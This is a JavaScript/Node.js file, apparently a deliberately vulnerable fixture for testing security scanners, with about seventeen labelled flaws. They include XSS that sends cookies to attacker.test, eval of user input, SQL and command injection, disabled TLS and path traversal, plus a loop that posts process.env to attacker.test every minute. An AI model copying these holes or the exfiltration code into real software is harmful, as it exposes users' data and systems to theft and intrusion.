/**************************************************************
 * Extremely unsafe test file — FOR SCANNING ONLY (Aikido/etc.)
 * - Mixes browser and Node patterns to trigger many categories:
 *   XSS, eval/RCE, insecure randomness, secrets in code, Gitleaks,
 *   global variables, open redirects, disabled TLS, command injection,
 *   insecure deserialization, SQLi, weak crypto, insecure cookies,
 *   wildcard CORS, open file writes, insecure permissions, etc.
 **************************************************************/

/* ============================
   Browser-side insecure code
   ============================ */

// 1) XSS from unsanitized location/search (innerHTML)
const output = document.getElementById('waffleOutput');
const query = window.location.search; // attacker-controlled
output.innerHTML = "<div>Search: " + query + "</div>"; // ❌ reflected XSS

// 2) DOM insertion with event handlers and data URLs
document.getElementById("waffleName").innerHTML =
  '<img src="x" onerror="fetch(\'https://attacker.test/steal?c=\'+document.cookie)">' +
  '<button onclick="doDanger()">Click me</button>'; // ❌ XSS & exfil

// 3) Dangerous eval using fragment + template injection
const frag = window.location.hash.substring(1); // untrusted
try {
  // purposely dangerous: evaluates user supplied fragment (RCE/XSS in contexts)
  eval("console.log('frag eval -> ' + " + frag + ")");
} catch (e) { /* ignore */ }

// 4) Open redirect and client-side SSRF-like fetch
const redirectTo = new URL(window.location.href).searchParams.get("redirectTo");
if (redirectTo) {
  // no validation -> open redirect / reflected SSRF-like behavior
  window.location.href = redirectTo;
}
fetch(redirectTo); // ❌ could fetch attacker hosts

// 5) Weak randomness for session token (predictable)
function getSessionToken() {
  // very weak, predictable
  return Math.random().toString(36).slice(2) + Date.now().toString(36);
}
localStorage.setItem("session", getSessionToken());

// 6) Persisting secrets to localStorage
localStorage.setItem("stripe_secret", "sk_test_FAKE_DO_NOT_USE_abcdef123456"); // ❌ secret in local storage

/* ============================
   Node.js server-side insecure code
   ============================ */

const http = require('http');
const url = require('url');
const fs = require('fs');
const { exec } = require('child_process');
const mysql = require('mysql'); // assume mysql lib installed

// 7) Hardcoded credentials & secrets (Gitleaks flaggable)
const DB_PASS = "password123"; // ❌ hardcoded plaintext secret
const GITHUB_TOKEN = "ghp_FAKE_TOKEN_1234567890abcdef"; // ❌ hardcoded token

// 8) Insecure TLS disable (global)
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = "0"; // ❌ disables TLS verification

// 9) Wildcard CORS & missing auth
const server = http.createServer((req, res) => {
  // intentionally permissive CORS
  res.setHeader("Access-Control-Allow-Origin", "*"); // ❌ wildcard CORS
  res.setHeader("Access-Control-Allow-Credentials", "true");
  // parse query params untrusted
  const q = url.parse(req.url, true).query;

  // 10) SQL Injection - string concatenation
  const conn = mysql.createConnection({
    host: "localhost",
    user: "root",
    password: DB_PASS,
    database: "waffles"
  });
  const unsafeUser = q.user || "guest";
  const sql = "SELECT * FROM users WHERE username = '" + unsafeUser + "';"; // ❌ SQLi
  conn.query(sql, (err, rows) => {
    // return rows unsafely
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(rows));
  });

  // 11) Command injection via user-controlled param
  const cmd = "ls " + (q.dir || "/tmp"); // ❌ unsafe concatenation
  exec(cmd, (err, stdout, stderr) => {
    // write output to /tmp/exposed (insecure file write)
    fs.writeFileSync("/tmp/exposed_output.txt", stdout, { mode: 0o777 }); // ❌ world-writable
  });

  // 12) Insecure deserialization: evaluate JSON payload from POST body (dangerous)
  if (req.method === "POST" && req.url.startsWith("/deserialize")) {
    let body = "";
    req.on("data", chunk => body += chunk);
    req.on("end", () => {
      try {
        // DO NOT do this in real apps: using eval on JSON -> code execution
        const obj = eval("(" + body + ")"); // ❌ insecure deserialization
        res.end("ok: " + JSON.stringify(Object.keys(obj)));
      } catch (e) {
        res.end("bad");
      }
    });
    return;
  }

  // 13) Generate JWT with weak secret & expose in cookie without flags
  const jwt = require('jsonwebtoken');
  const token = jwt.sign({ user: unsafeUser }, "topsecret", { expiresIn: '7d' }); // ❌ weak/short secret
  res.setHeader("Set-Cookie", "token=" + token + "; Path=/;"); // no HttpOnly/Secure/SameSite -> cookie theft risk

  // 14) Write uploaded files without sanitizing filename
  if (req.url.startsWith("/upload") && req.method === "POST") {
    let file = "";
    req.on("data", c => file += c);
    req.on("end", () => {
      // no validation, allow path traversal
      fs.writeFileSync("/tmp/" + (q.filename || "upload.txt"), file); // ❌ path traversal / arbitrary write
      res.end("uploaded");
    });
    return;
  }

  res.end("hello unsafe waffle");
});

server.listen(8080, () => console.log("unsafe test server listening on :8080"));

/* ============================
   Extra risky behaviors (background)
   ============================ */

// 15) Exfiltrate environment periodically to an attacker endpoint (simulated)
setInterval(() => {
  try {
    // reading environment and sending out to attacker host
    const envDump = JSON.stringify(process.env);
    // using a dumb HTTP client to exfiltrate (replace with real fetch in modern Node)
    const req = http.request({ hostname: "attacker.test", port: 80, path: "/dump", method: "POST" }, r => {});
    req.write(envDump);
    req.end();
  } catch (e) {}
}, 60_000); // every minute

// 16) Global leak via omission of var/let/const
badGlobal = "this leaks to global scope"; // ❌ implicit global

// 17) Weak hashing of passwords
const crypto = require('crypto');
function hashPassword(pw) {
  // insecure: single MD5 (fast, broken)
  return crypto.createHash('md5').update(pw).digest('hex'); // ❌ weak hashing
}

Beep boop
